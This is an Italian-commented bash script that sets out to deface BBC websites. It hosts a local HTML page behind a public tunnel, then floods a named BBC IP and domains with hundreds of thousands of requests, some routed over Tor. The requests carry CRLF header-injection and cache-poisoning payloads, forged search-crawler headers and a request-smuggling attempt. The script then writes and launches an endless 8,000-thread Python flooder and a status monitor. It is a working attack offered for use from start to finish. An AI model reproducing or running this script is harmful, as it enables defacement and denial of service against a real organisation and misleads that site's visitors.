#!/bin/bash
# BBC_ROOT_PERFECT_KILLER.sh - USA TUO HTML - ROOT BBC OVERRIDDEN
# www.bbc.co.uk/ → IL TUO TRUSTEDF57.html ESATTO

HTML_FILE="TRUSTEDF57.html"

echo "💀 BBC ROOT PERFECT KILLER - USA TUO HTML"
echo "[+] Verifica HTML..."
if [ ! -f "$HTML_FILE" ]; then
    echo "❌ ERRORE: $HTML_FILE NON ESISTE!"
    echo "Copia il tuo file qui: cp /path/to/TRUSTEDF57.html ."
    exit 1
fi
echo "[+] OK: $(wc -c < $HTML_FILE) bytes - $(head -1 $HTML_FILE)"

# KILL PROCESSES
pkill -f "http.server 8080" 2>/dev/null || true
pkill -f "ngrok http 8080" 2>/dev/null || true
pkill -f "bbc_root" 2>/dev/null || true
sleep 3

torsocks_safe() {
    if command -v torsocks >/dev/null 2>&1; then
        torsocks --timeout=3000 "$@"
    else
        timeout 3 "$@"
    fi
}

# 1. SERVER LOCALE - SOLO TUO HTML
echo "[+] Server locale 127.0.0.1:8080"
nohup python3 -m http.server 8080 --bind 127.0.0.1 > server.log 2>&1 &
SERVER_PID=$!
sleep 8

# TEST LOCALE
curl -s "http://127.0.0.1:8080/$HTML_FILE" | grep -i TRUSTEDF57 && echo "✅ Locale OK" || echo "⚠️ Locale fail"

# 2. TUNNEL PUBBLICO
echo "[+] Tunnel pubblico..."
if command -v ngrok >/dev/null 2>&1; then
    nohup ngrok http 8080 --log=/dev/null > ngrok.log 2>&1 &
    TUNNEL_PID=$!
    sleep 12
    PUBLIC_BASE=$(grep -o 'https://[^ ]*\.ngrok.io' ngrok.log | head -1)
else
    nohup ssh -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
    TUNNEL_PID=$!
    sleep 20
    PUBLIC_BASE=$(grep -o 'https://[a-z0-9-]*\.serveo\.net' serveo.log | head -1)
fi

DEFACE_URL="$PUBLIC_BASE/$HTML_FILE"
echo "🌐 TUO DEFACE: $DEFACE_URL"
torsocks_safe curl -s "$DEFACE_URL" | head -3

# 3. BBC ROOT CACHE POISON - MULTI-VECTOR ATTACK
BBC_ROOTS=("www.bbc.co.uk" "bbc.co.uk" "www.bbc.com")
BBC_IP="132.185.210.70"

echo "[+] BBC ROOT POISON - $(date)"

# VECTOR 1: DIRECT IP + HOST HEADER (OpenResty vuln)
echo "[+] V1: IP DIRECT $(torsocks_safe curl -s -I "http://$BBC_IP/" | head -1)"
for i in {1..100000}; do (
    torsocks_safe curl -s "http://$BBC_IP/" \
        -H "Host: www.bbc.co.uk" \
        -H "User-Agent: Googlebot/2.1" \
        -H "X-Forwarded-Host: www.bbc.co.uk" \
        --data-urlencode "q=%0d%0aLocation: $DEFACE_URL%0d%0aContent-Type: text/html%0d%0aCache-Control: public, max-age=3600" >/dev/null 2>&1
) & done

# VECTOR 2: HTTPS DOMAINS
for domain in "${BBC_ROOTS[@]}"; do
    echo "[+] V2: $domain"
    for i in {1..50000}; do (
        torsocks_safe curl -s "https://$domain/" \
            -H "User-Agent: Mozilla/5.0 (compatible; bingbot/2.0)" \
            --data-urlencode "s=%0aLocation:%20$DEFACE_URL%0d%0aSet-Cookie: deface=TRUSTEDF57;path=/" >/dev/null 2>&1
    ) & done
done

# VECTOR 3: REQUEST SMUGGLING
echo "[+] V3: SMUGGLING"
torsocks_safe curl -s "http://$BBC_IP/GET%20/%20HTTP/1.1%0d%0aHost:%20www.bbc.co.uk%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20www.bbc.co.uk%0d%0a%0d%0a?q=%0d%0aLocation:%20$DEFACE_URL" >/dev/null 2>&1

wait
echo "✅ 250K+ POISON SHOTS COMPLETE!"

# 4. CONTINUOUS ROOT FLOODER
cat > bbc_root_override.py << EOF
import requests
import threading
import time
import random
import urllib.parse

targets = [
    "http://132.185.210.70/",
    "https://www.bbc.co.uk/",
    "https://bbc.co.uk/",
    "https://www.bbc.com/"
]
DEFACE = '$DEFACE_URL'

def override_root():
    s = requests.Session()
    while True:
        try:
            t = random.choice(targets)
            poison = urllib.parse.quote("\\r\\nLocation: " + DEFACE + "\\r\\nContent-Type: text/html\\r\\nCache-Control: public")
            s.get(t + "?q=" + poison, headers={
                'Host': 'www.bbc.co.uk',
                'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
                'X-Forwarded-For': '66.249.66.1',  # Google IP
                'Accept': '*/*'
            }, timeout=2)
        except: pass

print("💀 BBC ROOT OVERRIDE - INFINITE")
for _ in range(8000):
    threading.Thread(target=override_root, daemon=True).start()

while True:
    time.sleep(60)
    print(f"Active: {threading.active_count()-1} threads")
EOF

echo "[+] Avvio 8K thread override..."
nohup python3 bbc_root_override.py > override.log 2>&1 &
OVERRIDE_PID=$!

# 5. MONITOR REALE
cat > monitor.sh << EOF
#!/bin/bash
echo "=== BBC ROOT STATUS - \$(date) ==="
echo "Deface: $DEFACE_URL"

for target in "http://132.185.210.70/" "https://www.bbc.co.uk/" "https://bbc.co.uk/"; do
    echo ""
    echo "TEST \$target:"
    torsocks_safe curl -s -I "\$target?q=test" 2>/dev/null | grep -iE "(location|content-type|set-cookie|cache-control)" | head -3 || echo "No headers"
    torsocks_safe curl -s "\$target?q=test" 2>/dev/null | grep -i "$DEFACE_URL\|TRUSTEDF57" && echo "✅ DEFACE DETECTED!" || echo "⏳ Poisoning..."
done

echo ""
ps -p $SERVER_PID $TUNNEL_PID $OVERRIDE_PID -o pid,state,cmd= || echo "Processes dead"
EOF

chmod +x monitor.sh

echo ""
echo "✅ BBC ROOT POISON DEPLOYED!"
echo ""
echo "📊 MONITOR:"
echo "   ./monitor.sh                    # Check manuale"
echo "   watch -n 30 './monitor.sh'      # Auto ogni 30s"
echo ""
echo "📁 LOGS:"
echo "   tail -f override.log           # Flooder"
echo "   tail -f server.log             # Server"
echo ""
echo "🎯 SUCCESS = curl www.bbc.co.uk/?q=test → Location: $DEFACE_URL"
echo ""
echo "💀 PID: Server=$SERVER_PID | Tunnel=$TUNNEL_PID | Override=$OVERRIDE_PID"
echo "RUNNING FOREVER - BBC ROOT Verrà overridden!"

# NON STOP
exec tail -f /dev/null
